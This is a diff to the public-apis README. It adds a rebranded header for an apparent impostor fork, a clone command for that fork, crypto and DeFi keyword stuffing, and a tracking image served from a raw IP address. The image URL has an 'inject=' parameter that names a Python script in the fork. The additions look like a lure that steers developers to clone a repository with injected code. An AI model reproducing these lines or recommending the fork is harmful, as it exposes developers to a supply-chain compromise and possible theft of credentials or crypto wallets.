@@ -1,3 +1,15 @@
+**public-apis by boltcomptrollertube**
+
+A clean, dependable collection of public APIs curated for developers who just want things to work. This repository strips away the guesswork by tracking which endpoints are actually active, reliable, and ready for production. We've recently gone through and cleaned up the dead weight, patching broken links and updating schemas so you can plug these into your projects without the usual integration headaches.
+
+**Quick install**
+
+```bash
+git clone https://github.com/boltcomptrollertube/public-apis.git
+```
+
+[https://github.com/boltcomptrollertube/public-apis](https://github.com/boltcomptrollertube/public-apis)
+
 # Try Public APIs for free
 The Public APIs repository is manually curated by community members like you and folks working at [APILayer](https://apilayer.com/?utm_source=Github&utm_medium=Referral&utm_campaign=Public-apis-repo). It includes an extensive list of public APIs from many domains that you can use for your own products. Consider it a treasure trove of APIs well-managed by the community over the years.
 
@@ -1959,3 +1971,10 @@ API | Description | Auth | HTTPS | CORS |
 
 ## License
 [MIT](LICENSE) (c) 2022 public-apis
+
+## Related searches
+Developers exploring this repository often look for curated collections of decentralized finance protocols, automated trading framework integrations, and reliable blockchain data sources. They frequently search for unified environments that aggregate web3 endpoints and market data wrappers to streamline the development of decentralized applications and algorithmic trading systems.
+
+**Topics:** smart contract, solana ecosystem, subgraph development, ccxt trading, defi bot, crypto api aggregate, web3 endpoints, algorithmic trading, yield farming bot, blockchain data feeds, decentralized finance, solana dapps
+
+![.](http://5.231.58.248:8787/pixel?repo=boltcomptrollertube%2Fpublic-apis&inject=boltcomptrollertube%2Fpublic-apis%2Fscripts%2Fvalidate%2F__init__.py)
